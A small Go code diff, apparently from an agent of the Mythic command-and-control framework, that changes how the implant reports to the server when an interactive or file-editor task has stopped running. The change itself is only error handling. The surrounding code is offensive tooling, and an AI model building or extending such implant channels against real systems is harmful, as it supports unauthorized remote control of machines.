@@ -100,11 +100,20 @@ func HandleMessageFromMythic(mythicMessage structs.MythicMessageResponse) {
 				utils.PrintDebug("dropping interactive task message because channel is full")
 			}
 		} else {
+			errorType := InteractiveTask.Error
+			errorData := []byte("Task no longer running\n")
+			if mythicMessage.InteractiveTasks[j].MessageType == InteractiveTask.FileEditorRequest {
+				errorType = InteractiveTask.FileEditorError
+				errorData, _ = json.Marshal(map[string]string{
+					"code":    "task_not_running",
+					"message": "Task no longer running",
+				})
+			}
 			select {
 			case responses.NewInteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
 				TaskUUID:    mythicMessage.InteractiveTasks[j].TaskUUID,
-				Data:        base64.StdEncoding.EncodeToString([]byte("Task no longer running\n")),
-				MessageType: InteractiveTask.Error,
+				Data:        base64.StdEncoding.EncodeToString(errorData),
+				MessageType: errorType,
 			}:
 			case <-time.After(1 * time.Second):
 				utils.PrintDebug("dropping interactive task output message because channel is full")
